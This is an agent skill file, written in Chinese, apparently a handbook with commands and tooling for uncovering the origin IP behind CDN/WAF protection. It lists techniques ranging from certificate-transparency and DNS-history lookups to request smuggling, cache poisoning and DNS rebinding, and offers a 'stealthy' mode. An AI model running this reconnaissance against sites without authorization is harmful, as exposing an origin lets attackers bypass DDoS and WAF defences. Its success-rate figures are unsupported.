---
name: cdn-origin-tracing
description: CDN/WAF 真实 IP 溯源 — 50 种技术深度实战手册（v5.1）。绕过 Cloudflare/Akamai/阿里云/腾讯云/AWS 等 CDN 找源站 IP。含 Python 自动化工具（14 阶段流水线：CT 子域名解析、IPv6/CNAME 链、Wayback 历史 IP、反向 IP 旁站、Favicon mmh3、TLS 五元组指纹、贝叶斯评分）。触发：CDN溯源、找真实IP、绕过CDN、源站IP、origin IP、CDN bypass、Cloudflare绕过、DNS Rebinding。
---

# CDN/WAF 真实 IP 溯源 — 深度实战手册 v5.1

> Author: 思念 (狗盾思念) · 50 种溯源技术 · 30+ CDN 厂商绕过 · 2025-2026 最新方法 · JA3/JA4/HTTP2 现代指纹验证 · Python 自动化 Pipeline · 贝叶斯置信度评分 · 组合拳成功率 95%+

## 核心原则：分层组合 + 现代指纹验证

**单方法成功率有限，分层组合拳成功率 95%+。** v5.0 推荐分层流水线：

```
第一层(发现)  crt.sh证书 → 子域名枚举(含AltDNS) → 历史DNS聚合 → 被动DNS多源交叉
第二层(暴露)  网络空间引擎(Shodan/Censys/FOFA) → CSP/CORS/JS端点 → 云存储桶枚举
第三层(触发)  邮件头/Pingback → 缓存投毒/请求走私 → SaaS/Serverless源站发现
第四层(验证)  Host头验证 → JA3/JA4 TLS指纹 → HTTP/2 Akamai指纹 → 页面哈希一致性
```

**关键升级**：v5.0 将"验证"独立成层，避免传统方法只发现不验证导致的误报。Host 头返回 200 ≠ 源站（可能是 CDN 节点或共享主机），必须用 JA3/JA4 + HTTP/2 指纹交叉确认。

## 实战快速启动（v5.0 新增 · 开箱即用）

> 本技能自带三个可运行 Python 工具，位于技能目录下：
> - [cdn_tracer.py](file:///data/user/skills/cdn-origin-tracing/cdn_tracer.py) — 端到端溯源主程序（14 阶段流水线：CT 子域名解析、API-Key 被动 DNS、IPv6/CNAME 链、Wayback 历史 IP、反向 IP、favicon 哈希、JA3 风格指纹）
> - [cdn_ranges.py](file:///data/user/skills/cdn-origin-tracing/cdn_ranges.py) — CDN IP 段数据库 + 过滤器（51 家厂商 / 213 静态段 + 自动加载深度数据；首字节桶索引加速批量查询）
> - [cdn_ip_collector.py](file:///data/user/skills/cdn-origin-tracing/cdn_ip_collector.py) — 深度 IP 段收集器（8 源并发 · 实测 52,108 段 · 覆盖 36 家厂商；CIDR 相邻合并）
>
> 仅依赖 `requests` + 标准库；Windows/Linux/macOS 通用；openssl 用于 TLS 指纹（可选）。
> **深度收集**：`python cdn_ip_collector.py` 从 Cloudflare/AWS/Azure/Fastly/GCP 官方源 + bgpview + RIPE Stat + RADB 三源按 ASN 并发拉取（同 ASN 多厂商共享时自动去重，仅拉一次），合并去重后自动加载到 `cdn_ranges.py`，彻底解决"IP 段太少"问题。

### 一键全流程溯源

```bash
# 安装依赖 (仅需一次)
pip install requests

# 进入技能目录
cd .trae/skills/cdn-origin-tracing

# 全流程 14 阶段: 识别CDN → crt.sh证书 → CT子域名解析 → 词表枚举 → 被动DNS聚合
#   → MX/SPF邮件 → CNAME链+IPv6 → Wayback历史IP → CDN过滤 → 反向IP旁站
#   → Host头验证 → TLS五元组指纹 → 页面哈希+Favicon mmh3 → 贝叶斯评分
python cdn_tracer.py target.com
# 输出: 终端彩色排名表 + report_target_com_<时间戳>.json

# 常用参数
python cdn_tracer.py target.com --threads 30        # 提高并发
python cdn_tracer.py target.com -o result.json      # 指定输出
python cdn_tracer.py target.com --no-verify         # 仅被动发现(不直连,隐蔽)
python cdn_tracer.py target.com --no-fingerprint    # 跳过TLS/哈希/Favicon(加速)
python cdn_tracer.py target.com --no-wayback        # 跳过 Wayback 历史快照
python cdn_tracer.py target.com --no-reverse        # 跳过反向 IP 旁站查询
python cdn_tracer.py target.com --no-online         # 跳过在线深度收集

# 付费 API 增强 (可选, 提高被动 DNS 命中率)
python cdn_tracer.py target.com --api-keys '{"securitytrails":"ST_KEY","virustotal":"VT_KEY"}'
```

**v5.1 强化要点（相对旧版）**：
- CT 证书发现的子域名现在会**实际解析成 IP**（含泛解析过滤），不再只收集名字
- `--api-keys` 真正落地：SecurityTrails / VirusTotal 被动 DNS 数据并入聚合
- 新增 IPv6 (AAAA) 溯源、CNAME 链追踪（识别 CNAME 指向的非 CDN 终端）
- 新增 Wayback Machine 历史快照 IP 提取（挖 CDN 启用前的源站）
- 新增反向 IP 旁站查询（候选 IP 上托管的域名含目标 = 强源站证据）
- 新增 Favicon mmh3 哈希一致性验证（与 Shodan favicon 搜索同源技术）
- TLS 指纹升级为五元组（版本/密码套件/证书颁发者/有效期/ SAN），JA3 风格对比

### CDN IP 段过滤 (独立使用)

```bash
# 查询单个 IP 是否属于 CDN
python cdn_ranges.py 104.16.1.1           # → CDN: Cloudflare (AS13335)
python cdn_ranges.py 156.234.170.5        # → CDN: Anti-DDoS（鸡哥CDN）

# 批量过滤候选 IP, 排除 CDN, 留下疑似源站
# (v5.1: 首字节桶索引, 52k+ 网段批量过滤从线性扫描优化为同桶比对, 万级查询毫秒级)
python cdn_ranges.py --filter 1.2.3.4 104.16.1.1 8.8.8.8 156.247.33.10

# 导出全部 IP 段为 JSON (供其他工具消费)
python cdn_ranges.py --dump > cdn.json

# 在自己的 Python 脚本中调用
# from cdn_ranges import is_cdn, filter_candidates, get_vendor
```

### 深度 IP 段收集 (cdn_ip_collector · v5.0 新增 · 8 源并发)

> 静态库会过期，单个 API 源不够全。**深度收集器** 从 8+ 源并发拉取，是解决"IP 段太少"的终极方案。

```bash
# 全量拉取所有厂商 (43 个 ASN, 每个 ASN 拉 3 个源, 实测 52,108 段)
python cdn_ip_collector.py
# 输出: cdn_ranges_full.json (1.4 MB)
# 之后 cdn_ranges.py 自动加载该文件, 无需手动指定

# 仅拉取指定厂商
python cdn_ip_collector.py --vendor Cloudflare,"阿里云 CDN","腾讯云 CDN"

# 输出纯 CIDR 列表 (供其他工具)
python cdn_ip_collector.py --merge > all_cdn_ranges.txt

# 自定义输出
python cdn_ip_collector.py --output my_collection.json --workers 16
```

**8+ 源详细说明**:

| 源 | 覆盖范围 | 格式 | 可靠性 |
|----|---------|------|--------|
| Cloudflare ips-v4/v6 | Cloudflare 边缘节点 | 纯文本 CIDR | 官方, 最准 |
| AWS CloudFront JSON | CloudFront 全球+区域边缘 | JSON | 官方, 最全 |
| Fastly public-ip-list | Fastly 边缘节点 | 纯文本 | 官方 |
| Azure ServiceTags | FrontDoor/CDN 标签 | JSON | 官方 |
| GCP Cloud IP Ranges | Google Cloud/CDN/GFE | JSON | 官方, 但过于宽泛 |
| Akamai 社区列表 | Akamai 边缘节点 | GitHub | 社区维护 |
| bgpview.io ASN | 所有 40+ 个 ASN | JSON API | 第三方, 含历史 |
| RIPE Stat API | 所有 40+ 个 ASN | JSON API | 权威, 当前 BGP |
| RADB whois | 所有 40+ 个 ASN | 本地 whois | 权威, 但可能不全 |

**v5.1 收集器优化**：Azure ServiceTags URL 自动按周滚动（硬编码日期会过期，现回滚尝试最近 6 周）；多个国内厂商共用 ASN（如 AS9801）时只拉取一次；输出前对 CIDR 做相邻合并（`1.0.0.0/24 + 1.0.1.0/24 → 1.0.0.0/23`），段数更少、查询更快。

```bash
# 自动加载: cdn_ranges.py 检测到 cdn_ranges_full.json 时自动加载
python cdn_ranges.py 104.16.1.1  # 自动含 52,108 段 → 精准识别

# 手动加载 (任意路径)
python cdn_ranges.py --load-full custom_collection.json

# 查看统计
python cdn_ranges.py
# → 厂商: 51 | 静态 IPv4: 213 | 在线: 38,514 v4 / 13,594 v6
# → 深度数据: ✓ 已自动加载 cdn_ranges_full.json
```

### 深度收集 CDN IP 段 (在线实时拉取 · v5.0 核心)

> 静态库会过期，ASN 是稳定标识。本工具可从权威源**实时拉取完整 IP 段**，与静态库合并后查询。

```bash
# 拉取全部厂商官方源 + 按 ASN 拉取所有前缀 (深度收集, 推荐溯源前先跑)
python cdn_ranges.py --refresh
#   官方源: Cloudflare ips-v4/v6, AWS CloudFront JSON, Fastly, Azure ServiceTags
#   ASN 拉取: 51 家厂商全部 ASN 经 bgpview API 拉取所有前缀
#   结果合并去重, 保存 cdn_ranges_online.json 缓存

# 仅刷新指定厂商
python cdn_ranges.py --refresh Cloudflare "阿里云 CDN"

# 离线场景: 加载上次缓存 (免联网)
python cdn_ranges.py --load-cache

# 之后所有查询 (单IP / --filter) 自动包含在线数据
python cdn_ranges.py 104.16.1.1          # 已含在线拉取的最新段
```

```python
# 在 cdn_tracer.py 或自定义脚本中调用
from cdn_ranges import refresh, is_cdn, filter_candidates
refresh()                                  # 在线深度收集 (耗时 5-15s)
print(filter_candidates(["104.16.1.1", "1.2.3.4"]))  # 含在线段过滤
```

### 端到端实战工作流（5 步拿源站 IP）

```
步骤 0  深度收集  python cdn_ip_collector.py                 # 首次: 8 源拉取 52,108 段
        → 之后 cdn_ranges.py 自动加载, 每次查询含 38,727 段

步骤 1  快速识别  python cdn_tracer.py target.com --no-verify --no-fingerprint
        → 秒级拿到候选 IP 列表 (被动发现, 隐蔽无直连)

步骤 2  深度验证  python cdn_tracer.py target.com
        → Host 头 + TLS 指纹 + 页面哈希 + 贝叶斯评分, 终端输出置信度排名

步骤 3  人工补强  若 P<0.80, 用 SKILL.md 方法 4 查 Shodan/FOFA 证书反查
        cert="target.com" && header!="cf-ray"   # FOFA 排除 CDN

步骤 4  交叉确认  python cdn_ranges.py --filter <新发现的IP>
        → 自动含 38,727 段, 精准排除 CDN IP (含鸡哥CDN 复用段)

步骤 5  持续监控  python cdn_origin_monitor.py target.com --interval 3600
        → 源站 IP 漂移检测 (见「持续监控」章节)
```

### 输出解读

```
排名  IP               置信度    TLS差异  哈希一致  判定
----------------------------------------------------------------------
1     203.0.113.5      97.3%     ✓        ✓        几乎确定源站   ← P≥0.95 直接确认
2     198.51.100.10    84.2%     ✓        -        高度疑似源站   ← 补指纹确认
3     192.0.2.7        42.1%     -        -        可疑           ← 排除或补证

Top 1 证据:
  A_cert: ✓   B_dns_history: ✓   C_subdomain: ✓
  D_mail: ✗   E_fingerprint: ✓   F_space_engine: ✓
```

> **判定阈值**: P≥0.95 直接确认源站 | 0.80-0.95 补 TLS/哈希指纹 | <0.80 排除或补 Shodan/FOFA
> **失败兜底**: 候选为空时，按 SKILL.md「决策树」选择目标画像分支方法（Cloudflare Tunnel→方法27/41、国内站→方法12+34、移动App→方法40+49、Serverless→方法29+43）

## 溯源方法完整矩阵（v5.0 深度优化 · 50 种方法）

| 排名 | 方法 | 成功率 | 速度 | 自动化 | 关键工具 |
|------|------|--------|------|--------|----------|
| 1 | SSL 证书透明度日志 | 85% | 秒级 | 是 | crt.sh, Censys, CertSpotter |
| 2 | 子域名枚举 | 80% | 分钟级 | 是 | Subfinder, Amass, OneForAll |
| 3 | 历史 DNS 记录 | 75% | 秒级 | 是 | SecurityTrails, HackerTarget, VirusTotal |
| 4 | 网络空间搜索引擎 | 70% | 秒级 | 是 | Shodan, FOFA, ZoomEye, Censys, Quake |
| 5 | CNAME 解析链追踪 | 70% | 秒级 | 是 | dig |
| 6 | CDN IP 范围反查 | 65% | 分钟级 | 部分 | cdn_ranges.py, ASN, bgp.he.net |
| 7 | SPF 邮件记录 | 60% | 秒级 | 是 | dig |
| 8 | MX 邮件服务器关联 | 55% | 秒级 | 是 | dig MX |
| 9 | Host 头验证 | 55% | 分钟级 | 是 | curl, httpx, cdn_tracer.py |
| 10 | 第三方服务 ID 关联 | 50% | 分钟级 | 否 | Google Analytics, 百度统计 |
| 11 | 网站功能泄露 | 50% | 分钟级 | 否 | RSS, robots.txt, sitemap |
| 12 | ICP 备案查询 | 45% | 秒级 | 否 | beian.miit.gov.cn |
| 13 | XML-RPC Pingback 泄露 | 40% | 秒级 | 是 | curl, nc |
| 14 | 邮件头分析 | 45% | 分钟级 | 否 | 邮件客户端, eml_parser |
| 15 | Favicon 哈希匹配 | 40% | 分钟级 | 部分 | Shodan, FOFA, mmh3 |
| 16 | DNS ANY / 搜索引擎缓存 | 35% | 秒级 | 部分 | dig ANY, Wayback Machine |
| 17 | IPv6 解析 | 25% | 秒级 | 是 | nslookup -type=AAAA |
| 18 | DNS 区域传送 | 15% | 秒级 | 是 | dig AXFR |
| 19 | AltDNS 排列 + 泛解析过滤 | 45% | 分钟级 | 是 | altdns, dnsgen |
| 20 | 多 DNS 解析器交叉验证 | 60% | 秒级 | 是 | dnsx, massdns |
| 21 | CSP / CORS 头泄露 | 40% | 秒级 | 是 | curl |
| 22 | CDN 回源 IP 段利用 | 55% | 分钟级 | 是 | CDN 文档, nmap |
| 23 | JavaScript / API 端点泄露 | 45% | 分钟级 | 半自动 | curl, grep, JS 解析 |
| 24 | 被动 DNS 数据聚合 | 80% | 秒级 | 是 | 多源聚合 |
| 25 | 证书颁发机构 (CA) 分析 | 50% | 秒级 | 是 | crt.sh, openssl |
| 26 | HTTP 重定向链分析 | 35% | 秒级 | 是 | curl -L |
| **27** | **Cloudflare Tunnel/cloudflared 绕过** | **35%** | 分钟级 | 半自动 | dig, cloudflared 配置泄露 |
| **28** | **Cloudflare Pages/Workers/R2 源站暴露** | **45%** | 秒级 | 是 | crt.sh, *.pages.dev 枚举 |
| **29** | **Serverless / Lambda@Edge 源站泄露** | **40%** | 分钟级 | 半自动 | 日志触发, 错误页 |
| **30** | **HTTP/3 (QUIC) 源站发现** | **30%** | 秒级 | 是 | curl --http3, nmap |
| **31** | **TLS 1.3 ECH / SNI 操纵** | **25%** | 秒级 | 是 | openssl, curl --doh-url |
| **32** | **容器 / K8s Ingress 暴露** | **40%** | 分钟级 | 半自动 | Shodan, FOFA, Ingress 端口 |
| **33** | **CI/CD 管道泄露 (.git/Actions)** | **35%** | 分钟级 | 是 | .git 泄露, GitHub dork |
| **34** | **云存储桶枚举 (S3/OSS/COS/OBS)** | **50%** | 分钟级 | 是 | lazarus, bucket_finder |
| **35** | **WebSocket 长连接源站** | **30%** | 分钟级 | 是 | wscat, websocat |
| **36** | **缓存投毒/欺骗取源站** | **25%** | 分钟级 | 半自动 | 路径操纵, Header 注入 |
| **37** | **HTTP 请求走私 (CDN↔源站)** | **20%** | 分钟级 | 半自动 | smuggler, CL.TE/TE.CL |
| **38** | **GraphQL Introspection 泄露** | **35%** | 秒级 | 是 | curl, graphw00f |
| **39** | **SSE / Server-Sent Events 源站** | **25%** | 分钟级 | 是 | curl, EventSource |
| **40** | **移动 App / 小程序硬编码 IP** | **45%** | 分钟级 | 是 | jadx, apktool, Frida |
| **41** | **DNS Rebinding → SSRF 源站发现** | **40%** | 分钟级 | 半自动 | singularity, rbndr |
| **42** | **CDN 缓存清除/预热回源泄露** | **35%** | 分钟级 | 是 | CDN 管理面板, API |
| **43** | **HTTP/2 HPACK 压缩侧信道** | **25%** | 分钟级 | 半自动 | h2load, h2spec |
| **44** | **Anycast IP 去匿名化** | **30%** | 分钟级 | 是 | 多地 ping, 全球 VPS |
| **45** | **CDN Origin Shield / 中间源绕过** | **35%** | 分钟级 | 半自动 | 请求路由操纵 |
| **46** | **速率限制差分分析** | **30%** | 分钟级 | 半自动 | ffuf, 并发脚本 |
| **47** | **eBPF/XDP 源站旁路检测** | **20%** | 分钟级 | 否 | bpftrace, cilium |
| **48** | **跨域资源计时侧信道** | **25%** | 分钟级 | 半自动 | 浏览器 Performance API |
| **49** | **源站 IP 漂移实时追踪** | **50%** | 分钟级 | 是 | cdn_ranges monitor, cron |
| **50** | **CDN 回源认证绕过 (Signed URL/Token)** | **30%** | 分钟级 | 半自动 | Hashcat, 签名分析 |

---

## 第一阶段：CDN 识别（精准判定）

### 判断方法

```bash
# 1. 多地 Ping（最可靠）
# 国内: https://ping.chinaz.com/
# 国际: https://check-host.net/
# 判断标准: 不同地区返回不同 IP → 有 CDN

# 2. 在线 CDN 检测
# IPIP: https://tools.ipip.net/cdn.php
# Get-Site-IP: https://get-site-ip.com/
# CDNPlanet: https://www.cdnplanet.com/tools/cdnfinder/

# 3. 命令行检测
nslookup target.com
# 多个 IP 段 → 可能 CDN；单 IP → 可能无 CDN 或 Anycast

# 4. 响应头检测
curl -sI https://target.com | grep -iE "(cf-ray|cf-cache|x-cache|via:|x-amz-cf|server: cloudflare|x-sucuri|x-akamai)"
# cf-ray → Cloudflare; x-amz-cf-id → AWS CloudFront; x-cache → Akamai/Fastly
# via: → 通用代理; x-sucuri → Sucuri; x-akamai → Akamai
```

### 完整 CDN IP 段数据库（v5.0 大幅扩充 · 含 ASN · CIDR 格式可直接喂给过滤脚本）

> IP 段会更新，ASN 是最稳定的标识。实时查最新段：`whois -h whois.radb.net -- '-i origin AS13335' | grep route` 或 https://bgp.he.net/AS<ASN>

#### A. 国际 CDN 厂商

| CDN 厂商 | ASN | IP 段 (CIDR) | 识别特征 |
|----------|-----|-------------|----------|
| Cloudflare | AS13335 | 103.21.244.0/22, 103.22.200.0/22, 103.31.4.0/22, 104.16.0.0/13, 104.24.0.0/14, 108.162.192.0/18, 131.0.72.0/22, 141.101.64.0/18, 162.158.0.0/15, 172.64.0.0/13, 173.245.48.0/20, 188.114.96.0/20, 190.93.240.0/20, 197.234.240.0/22, 198.41.128.0/17 · IPv6: 2400:cb00::/32, 2606:4700::/32, 2803:f800::/32, 2c0f:f248::/32 | cf-ray, cf-cache-status, server: cloudflare |
| Amazon CloudFront | AS16509 | 13.32.0.0/15, 13.34.0.0/15, 13.224.0.0/14, 18.160.0.0/14, 18.64.0.0/15, 52.46.0.0/18, 52.84.0.0/15, 54.230.0.0/16, 54.233.0.0/18, 99.84.0.0/16, 116.129.226.0/24, 143.204.0.0/16, 205.251.192.0/19, 205.251.224.0/22, 205.251.248.0/22 | x-amz-cf-id, x-amz-cf-pop, via: CloudFront |
| Akamai | AS20940/AS16625 | 2.16.0.0/13, 2.21.0.0/16, 23.0.0.0/12, 23.32.0.0/11, 23.64.0.0/14, 72.246.0.0/13, 88.221.0.0/16, 95.100.0.0/14, 104.64.0.0/10, 184.24.0.0/13 | X-Akamai-*, X-Cache, AkamaiGHost, server: AkamaiGHost |
| Fastly | AS54113 | 23.235.32.0/20, 43.249.72.0/22, 103.244.50.0/24, 103.245.232.0/22, 151.101.0.0/16, 157.52.64.0/18, 167.82.0.0/17, 199.27.72.0/21, 199.232.0.0/16 | X-Served-By, X-Cache, via: Fastly |
| Google Cloud CDN/GCLB | AS15169 | 35.191.0.0/16, 130.211.0.0/22, 35.190.0.0/17, 35.190.128.0/18 · 注:GFE 共享 AS15169 | Server: Google Frontend, via: 1.1 google |
| Azure Front Door/CDN | AS8075 | 147.243.0.0/17 (FrontDoor 专用), 28.0.0.0/8 部分, 13.106.0.0/14, 20.0.0.0/8 部分, 52.224.0.0/14, 204.79.197.0/24 · Verizon/Akamai 引擎段见各自 | Server: Microsoft-Azure-Application-Gateway, x-azure-ref |
| Imperva Incapsula | AS19551 | 23.226.0.0/22, 23.235.32.0/20, 45.60.0.0/16, 45.64.64.0/22, 103.21.244.0/22, 103.28.248.0/22, 107.154.0.0/16, 198.143.32.0/19, 199.83.128.0/21 | X-CDN, X-Iinfo, via: Imperva, server: Incapsula |
| Sucuri | AS399758/AS54825 | 192.88.134.0/23, 192.124.249.0/24, 208.109.0.0/16 (部分) | X-Sucuri-ID, X-Sucuri-Cache, server: Sucuri/Cloudproxy |
| StackPath/Highwinds | AS33438/AS64600 | 64.145.0.0/16, 151.139.0.0/16, 207.244.0.0/16, 209.197.0.0/16 | X-StackPath-*, X-HW-*, via: stackpath |
| Edgecast/Verizon Digital | AS15133 | 93.184.0.0/16, 117.18.0.0/16, 192.16.0.0/12 (部分), 192.229.0.0/16 | X-EC-*, via: edgecast |
| CDN77 | AS60068 | 37.77.0.0/16, 138.199.0.0/16, 185.152.0.0/16 | X-CDN77-*, via: cdn77 |
| BunnyCDN | AS200919 | 185.156.0.0/16, 138.199.0.0/16, 188.114.0.0/16 | X-BunnyCDN-*, server: BunnyCDN |
| KeyCDN | AS61317 | 185.134.0.0/16, 185.180.0.0/16, 185.230.0.0/16 | X-Cache: HIT, server: keycdn |
| Gcore | AS199524 | 92.223.64.0/19, 5.188.120.0/22, 45.133.0.0/22 | Server: GCore, X-Cache |
| Quantil (ChinaCache 海外) | AS20428 | 204.10.0.0/16, 204.11.0.0/16, 66.159.0.0/16 | X-Cache, via: quantil |
| Leaseweb CDN | AS60626 | 23.108.0.0/19, 5.79.0.0/18, 178.162.0.0/17 | X-Cache, via: leaseweb |
| HiberniaCDN | AS43350 | 185.32.224.0/22, 109.71.0.0/19 | X-Cache, via: hiberniacdn |
| CDNetworks | AS36414 | 203.99.0.0/16, 66.114.0.0/16, 110.164.0.0/16 | X-Cache, via: CDNetworks |
| ArvanCloud | AS208827 | 37.32.0.0/19, 188.34.0.0/16, 185.143.0.0/16, 92.114.0.0/16 | Server: ArvanCloud, X-ArvanCloud-* |

#### B. 国内 CDN 厂商

| CDN 厂商 | ASN | IP 段 (CIDR) | 识别特征 |
|----------|-----|-------------|----------|
| 阿里云 CDN | AS37963 | 47.92.0.0/14, 47.96.0.0/11, 59.110.0.0/16, 112.124.0.0/14, 114.215.0.0/16, 118.31.0.0/16, 120.24.0.0/14, 120.52.0.0/16, 120.76.0.0/14, 121.40.0.0/14, 182.92.0.0/16, 203.107.1.0/24 (HTTPDNS) | X-Cache, X-Swift-*, via: alicdn, server: Tengine |
| 腾讯云 CDN/EdgeOne | AS45090/AS133478 | 119.28.0.0/16, 119.29.0.0/16, 119.91.0.0/16, 150.109.0.0/16, 162.62.0.0/16, 175.27.0.0/16, 193.112.0.0/16, 139.199.0.0/16, 123.207.0.0/16, 118.89.0.0/16 | X-NWS-LOG-UUID, server: tencent-cos, EO-*, edgeone |
| 百度云加速 | AS38365 | 106.38.0.0/15, 153.99.0.0/16, 180.76.0.0/16, 180.97.0.0/16, 182.61.0.0/16 | Server: bfe, YJS-* |
| 又拍云 | AS48024 | 58.222.0.0/16, 115.231.0.0/16 (部分), 117.50.0.0/16 (部分), 183.111.0.0/16 | X-Upyun-*, via: upyun |
| 七牛云 | AS9801/AS4812 | 58.83.0.0/16, 61.240.0.0/16, 115.231.0.0/16, 180.97.0.0/16 | X-Qiniu-*, server: qiniu |
| 网宿 ChinaNetCenter | AS4811/AS9801 | 101.71.0.0/16, 103.72.144.0/22, 113.207.0.0/16, 122.227.0.0/16, 122.228.0.0/16, 125.39.0.0/16, 180.97.0.0/16, 183.232.0.0/16, 222.184.0.0/16 | X-WS-*, via: wangsu |
| 帝联 Dnion | AS4808 | 101.71.0.0/16, 122.0.0.0/16, 182.16.0.0/16, 210.51.0.0/16 | via: d1cdn |
| 华为云 CDN | AS136990/AS55566 | 117.50.0.0/16, 119.3.0.0/16, 121.37.0.0/16, 139.159.0.0/16, 159.138.0.0/16 | X-HW-*, server: hcdn |
| 火山引擎 CDN | AS137673 | 146.56.0.0/16, 180.184.0.0/16 | X-Volc-*, server: volc-cache |
| 金山云 KSC | AS59019 | 111.202.0.0/16, 120.92.0.0/16, 182.92.0.0/16 | X-KSCDN-*, X-Cache |
| UCloud CDN | AS63758 | 23.105.0.0/16, 106.75.0.0/16, 117.50.0.0/16 (部分) | X-UCDN-*, via: ucdn |
| 京东云 CDN | AS59026 | 116.198.0.0/16, 117.72.0.0/16 | X-Cache, via: jdcloud |
| 白山云 Baishan | AS133823 | 36.99.0.0/16, 180.163.0.0/16 | X-Cache, via: baishan |
| 网易云 | AS45102 | 59.111.0.0/16, 115.236.0.0/16 | X-Cache, via: netease |
| 360 CDN | AS9801 | 101.198.0.0/16, 180.153.0.0/16 | X-Cache, via: 360cdn |
| 天翼云 | AS23724 | 61.183.0.0/16, 117.135.0.0/16 | X-Cache, via: ctyun |
| 青云 CDN | AS59344 | 36.156.0.0/16 | X-Cache, via: yunify |
| 西部数码 | AS56040 | 210.77.0.0/16 | X-Cache, via: wscdn |
| Anti-DDoS（鸡哥CDN） | 待确认 | 23.226.50.0/24, 156.234.170.0/24, 156.247.32.0/24, 156.247.33.0/24, 156.247.51.0/24 · 注:23.226.50.0/24 与 Imperva 段复用,需证书CN精确过滤 | X-Cache, via: jige CDN, server: nginx (海外中转) |
| 不死鸟CDN | 待确认 | 23.145.152.0/24, 23.145.136.0/24, 23.145.232.0/24, 203.168.128.0/24, 203.168.129.0/24, 23.180.136.0/24, 103.204.13.0/24, 222.167.33.0/24, 65.75.210.0/24, 139.162.100.0/24 + 单IP: 52.197.125.193, 13.158.136.14, 18.183.215.80, 176.65.139.8, 203.23.128.180 · 注:部分单IP属于AWS/AWS Japan,需证书CN过滤 | server: nginx (多区域中转), X-Cache |

#### C. ASN 实时反查命令（获取最新 IP 段）

```bash
# 任一 ASN 的全部 IPv4/IPv6 段 (RADB)
whois -h whois.radb.net -- '-i origin AS13335' | grep -E '^route|^route6'
# BGP 工具
curl -s "https://api.bgpview.io/asn/13335/prefixes" | jq '.data.ipv4_prefixes[].prefix'
# Cloudflare 官方段 (最准)
curl -s https://www.cloudflare.com/ips-v4 | tee cf_ranges.txt
curl -s https://www.cloudflare.com/ips-v6
# AWS CloudFront 官方 JSON
curl -s https://d7uri8nf7uskq.cloudfront.net/tools/list-cloudfront-ips | jq -r '.CLOUDFRONT_GLOBAL_IP_LIST[]'
# 阿里云: https://help.aliyun.com/document_detail/31898.html (HTTPDNS/CDN)
# 腾讯云: https://cloud.tencent.com/document/product/228/34832
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519 (ServiceTags JSON)
# 批量导出过滤脚本用: python3 -c "from cdn_ranges import build_all; build_all()"
```

---

## 第二阶段：50 种溯源方法（深度优化版，v5.0 扩展）

### 方法 1：SSL 证书透明度日志（成功率 85%，最推荐首试）

```bash
# 1. crt.sh 全方位查询（免费，无需 API）
# 全量子域名证书
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
# 含过期证书
curl -s "https://crt.sh/?q=%.target.com&output=json&exclude=expired" | jq -r '.[].name_value' | sort -u
# 按证书序列号分组（找出同一证书部署在多个 IP 上）
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[] | "\(.serial_number) | \(.name_value) | \(.common_name)"' | sort

# 2. CertSpotter API（备用）
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sort -u

# 3. Censys 证书搜索（推荐深度分析）
# 搜索同一证书序列号部署的所有 IP
# https://search.censys.io/certificates?q=parsed.names%3A%20target.com
# 登录后搜索: services.tls.certificates.leaf_data.issuer.common_name: "target.com"

# 4. 关键技巧：证书序列号关联
# 同一个证书如果部署在多台服务器上，可以通过序列号找到所有 IP
```

### 方法 2：子域名枚举（成功率 80%）

```bash
# 工具组合（不同工具互补，覆盖更多数据源）
subfinder -d target.com -all -o subs_subfinder.txt
amass enum -passive -d target.com -o subs_amass.txt
# 国内推荐 OneForAll
# git clone https://github.com/shmilylty/OneForAll
# python3 oneforall.py --target target.com run

# 合并去重
cat subs_*.txt | sort -u > subs_all.txt

# 高命中率 bypass 子域名字典（80+ 个）
# ├── 邮件类: mail, smtp, pop3, imap, webmail, mx, autodiscover, email, mta, relay, smtp2, mail2
# ├── FTP类: ftp, ftps, sftp, ftp2
# ├── 管理类: cpanel, whm, admin, manage, portal, dashboard, panel, control, console, cockpit
# ├── 开发类: dev, staging, test, staging2, dev2, uat, sandbox, beta, alpha, demo, preview
# ├── 直连类: direct, origin, backend, direct-connect, real, unprotected, bypass, no-cdn, raw
# ├── 网络类: vpn, ns1, ns2, ns3, dns, dns1, dns2, router, gateway, proxy, proxy2
# ├── 数据库类: mysql, db, database, redis, mongo, elastic, sql
# ├── SSH类: ssh, sftp, git, svn, gitlab
# ├── 静态类: static, img, images, upload, assets, cdn, media, files, download, docs
# ├── 移动类: m, mobile, app, api, ws, wss, websocket, api2, api3
# ├── 其他: www1, www2, blog, shop, forum, bbs, news, wiki, status, monitor, secure, remote, server, web, host, hosting, intranet
# └── 云服务: s3, storage, oss, cos, obs

# 批量解析并过滤 CDN IP
cat subs_all.txt | while read sub; do
  ip=$(dig +short $sub @8.8.8.8 | grep -E '^[0-9]' | head -1)
  [ -n "$ip" ] && echo "$sub → $ip"
done | grep -vE '(104\.(16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31)\.|172\.6[4-9]\.|172\.7[0-1]\.)' > non_cdn_subs.txt
```

### 方法 3：历史 DNS 记录（成功率 75%）

```bash
# 1. SecurityTrails（推荐，免费 50次/月）
curl -s -H "APIKEY: YOUR_KEY" "https://api.securitytrails.com/v1/history/target.com/dns/a" | jq -r '.records[].values[].ip'

# 2. VirusTotal（免费，数据量大）
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=YOUR_KEY&domain=target.com" | jq -r '.resolutions[].ip_address'

# 3. HackerTarget（免费，无需 API）
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

# 4. PassiveTotal / RiskIQ（需 API）
# 5. DNSDB（需 API，最全面）: https://www.farsightsecurity.com/
# 6. ViewDNS: https://viewdns.info/iphistory/?domain=target.com
# 7. DNSDumpster: https://dnsdumpster.com/
# 8. WhoisXML API: https://dns-history.whoisxmlapi.com/
# 9. CompleteDNS: https://completedns.com/dns-history/
# 10. AlienVault OTX: https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns
```

### 方法 4：网络空间搜索引擎（成功率 70%）

```bash
# === FOFA（国内首选）===
# domain="target.com" && cert="target.com"
# domain="target.com" && cert.subject.cn="target.com"
# title="target" && country="CN"
# cert="target.com" && type="subdomain"

# === Shodan ===
# hostname:target.com
# ssl.cert.subject.cn:target.com
# ssl:target.com
# org:"target"
# http.title:"target"
# http.favicon.hash:哈希值

# === ZoomEye ===
# site:target.com
# cert:target.com
# title:"target"
# hostname:target.com

# === Censys ===
